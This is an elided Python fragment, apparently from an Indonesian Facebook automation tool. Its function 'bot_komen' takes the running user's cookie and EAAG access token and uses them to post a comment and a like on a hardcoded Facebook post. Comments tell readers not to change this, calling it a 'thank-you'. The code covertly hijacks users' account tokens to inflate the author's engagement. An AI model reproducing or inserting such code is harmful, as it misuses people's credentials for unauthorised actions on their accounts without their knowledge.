...
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        ...
        response = r.post('https://graph.facebook.com/100043618273847/posts/pfbid02qjCDSGX8RyfPHpPoMDKbKiaqyTTsxGb1wNyyHYhqAd1w6BrmgRtSPwBvzycuZ5Spl/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/100043618273847/posts/pfbid02qjCDSGX8RyfPHpPoMDKbKiaqyTTsxGb1wNyyHYhqAd1w6BrmgRtSPwBvzycuZ5Spl/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
